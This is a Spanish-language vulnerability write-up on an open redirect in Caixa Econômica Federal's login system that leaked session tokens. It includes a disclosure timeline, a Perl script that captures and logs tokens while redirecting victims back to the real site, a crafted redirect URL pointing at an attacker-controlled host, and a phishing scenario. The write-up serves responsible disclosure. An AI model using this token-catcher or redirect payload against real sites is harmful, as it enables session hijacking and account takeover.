---
layout: content
title: 'Obteniendo un Session Token Leak con un Open Redirect'
description: ''
og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/email-poc.png
---

Tabla de contenido:
- [Resumen](#resumen)
- [Las vulnerabilidades](#descripción)
- [Prueba de concepto](#prueba-de-concepto)
- [Impacto](#impacto)
- [Conclusión](#conclusión)
- [Referencias](#referencias)

---

### Resumen

Esta publicación tiene como objetivo compartir como una vulnerabilidad de Open Redirect[1](#referencias) encontrada en el sitio web de la Caixa Econômica Federal, mediante la cual fue posible exponer los Tokens de Sesión de los usuarios.

Es importante aclarar que durante todas las pruebas realizadas, se utilizó únicamente la cuenta para la cual se contaba con la autorización del titular, y no se accedió ni se violó información de otras cuentas o usuarios durante el desarrollo de esta investigación y prueba de concepto.

Línea de tiempo:

```plaintext
01/01/2020: Descubrimiento de la vulnerabilidad y creación de la prueba de concepto; 
01/05/2020: La vulnerabilidad fue reportada; 
01/07/2020: Confirmación de la vulnerabilidad por parte de Caixa Econômica Federal; 
01/10/2020: Corrección de la vulnerabilidad; 
01/10/2020: Publicación de este artículo técnico;
```

---

### Las vulnerabilidades

Al explorar las páginas web de los sistemas de Caixa Federal, se identificó una pantalla de autenticación que solicitaba credenciales de acceso, tales como CPF (es como el DNI, pero de Brasil), NIS, correo electrónico y contraseña. La pantalla en cuestión corresponde al acceso al panel del "Portal Ciudadano".

![Página de inicio de Caixa Federal](/images/publications/caixa-account-takeover/home-page.png)

-

La URL:

[http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()

El último parámetro de la URL presenta una posible vulnerabilidad de Open Redirect: `&redirect_uri=`. El valor insertado en este parámetro indica a qué URL será redirigido el usuario al finalizar la actividad en cuestión, en este caso, el inicio de sesión.

Para validar esta posibilidad, se alteró el valor del parámetro `&redirect_uri=` en la URL original al link de la página principal de Google. Finalmente, al llenar las credenciales válidas e iniciar sesión, se obtuvo el siguiente resultado:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

-

Como se muestra, la aplicación contiene una vulnerabilidad de Open Redirect. Sin embargo, hay otro detalle: durante el redireccionamiento, se envió un parámetro adicional, como se puede observar en la URL:

[https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)

Tras analizar el parámetro `?code=` y la solicitud original, se pudo validar que el valor de este parámetro corresponde a un Token de Sesión[2].

Con esta conclusión, se hizo evidente que esta vulnerabilidad posee una alta criticidad, ya que el usuario podría ser víctima de un ataque en el que se redirija hacia una URL maliciosa controlada por un atacante, quien captura el Token de Sesión. Al hacerlo, el atacante obtiene acceso a la cuenta del usuario, violando la confidencialidad e integridad de sus datos.

---

### Prueba de concepto

Para demostrar la posibilidad de la filtración y captura del token, se utilizó el siguiente código en Perl:

```perl
#!/usr/bin/env perl
# perl catcher.pl daemon -m production -l http://\*:8080

use 5.030;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/" => sub ($catcher) {
    $catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");

    my $code = $catcher -> param("code");

    open (my $logs, ">>", "catcher.logs");
    print $logs "[+] - New Session Token -> '$code' has been catch.\n";
    close ($logs);

    return ($catcher -> render (
        text => "
            <script>window.location='https://acessoseguro.sso.caixa.gov.br/portal/login/?code=$code'</script>
        "
    ));

};

app -> start();
```

Este código tiene la función de capturar y almacenar los tokens de sesión enviados a la URL "maliciosa" controlada por el atacante. Además de capturar el Token de Sesión y almacenarlo en un archivo de registro, este script redirige nuevamente al usuario, esta vez hacia la URL legítima, asegurando así una sesión genuina en el sistema de Caixa Federal Econômica. Esto hace que un usuario común difícilmente sospeche que ha sido víctima de un engaño. La URL de la prueba de concepto se estructura de la siguiente manera:

https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/

El resultado obtenido se puede observar en esta grabación:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

La superficie de ataque en este escenario está restringida, ya que requiere que el usuario acceda a la URL por sí mismo (mediante phishing o ingeniería social).

El correo electrónico es enviado por un sistema oficial de la Caixa Econômica Federal. Sin embargo, al observar el link, podemos notar que la URL está "infectada" con el link bajo control del atacante. Al acceder al link y completar la redefinición de contraseña, el redireccionamiento aún ocurre, lo que resulta en la filtración del Token de Sesión.

Con esto, un atacante puede utilizar este mecanismo para enviar correos electrónicos solicitando la redefinición de contraseña en nombre de la Caixa Econômica Federal, otorgando mayor credibilidad al link malicioso. Este ataque puede realizarse a gran escala, ya que solo se necesita el CPF del objetivo para llevarlo a cabo.

---

### Impacto

Si esta vulnerabilidad fuera explotada, un atacante podría visualizar información confidencial del usuario, como se muestra a continuación:

![Datos Confidenciales del Usuario de Caixa Federal](/images/publications/caixa-account-takeover/confidential-data-user.png)

- Nombre completo, CPF, fecha y hora del último acceso;

-

![Datos Confidenciales del FGTS de Caixa Federal](/images/publications/caixa-account-takeover/confidential-data-fgts.png)

-

- Nombre completo, número del PIS, empresa contratante, número de la cartera de trabajo, cuenta FGTS, fecha de admisión, saldo en cuenta y los valores depositados en cada mes durante el período de trabajo en la empresa;

![Dirección Confidencial del Usuario de Caixa Federal](/images/publications/caixa-account-takeover/confidential-user-andress.png)

- Dirección completa del usuario (además, es posible editar estos datos, ya que no es necesario utilizar una contraseña);

---

### Conclusión

Un atacante podría explotar las vulnerabilidades mencionadas anteriormente y, de esta manera, comprometer la confidencialidad de varias cuentas legítimas de usuarios de la Caixa Econômica Federal.

Se recomendó a la Caixa Econômica Federal llevar a cabo una investigación para validar si estas vulnerabilidades estaban siendo explotadas por agentes malintencionados para la realización de fraudes.

---

#### Referencias

- [1] https://portswigger.net/kb/issues/00500100_open-redirection-reflected
- [2] https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet
- [3] https://www.owasp.org/index.php/Session_hijacking_attack